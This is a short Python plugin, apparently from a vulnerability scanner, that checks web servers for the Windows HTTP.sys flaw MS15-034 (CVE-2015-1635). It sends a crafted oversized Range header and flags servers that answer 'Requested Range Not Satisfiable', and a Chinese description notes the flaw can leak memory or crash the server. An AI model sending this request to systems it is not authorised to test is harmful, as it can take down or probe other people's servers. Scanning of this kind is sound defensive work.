# Author:w8ay
# Name:测试DEMO
'''
name: ms15_034 http.sys远程代码执行(CVE-2015-1635)
referer: http://www.myhack58.com/Article/html/3/62/2015/61431.htm
author: Lucifer
description: 利用HTTP.sys的安全漏洞，攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃，一定条件下可导致远程代码执行。
'''


import HackRequests

def poc(arg, **kwargs):
    hack = HackRequests.hackRequests()
    hh = hack.http(arg, headers={"Range": "bytes=0-18446744073709551615"})
    if "Requested Range Not Satisfiable" in hh.text() and "nginx" not in hh.header:
        result = {
            "name": "ms15_034",  # 插件名称
            "content": "ms15_034 http.sys远程代码执行(CVE-2015-1635),攻击者只需要发送恶意的http请求数据包，就可能远程读取IIS服务器的内存数据，或使服务器系统蓝屏崩溃，一定条件下可导致远程代码执行",  # 插件返回内容详情，会造成什么后果。
            "url": arg,  # 漏洞存在url
            "log": hh.log,
            "tag": "remote"  # 漏洞标签
        }
        return result




if __name__ == "__main__":
    pass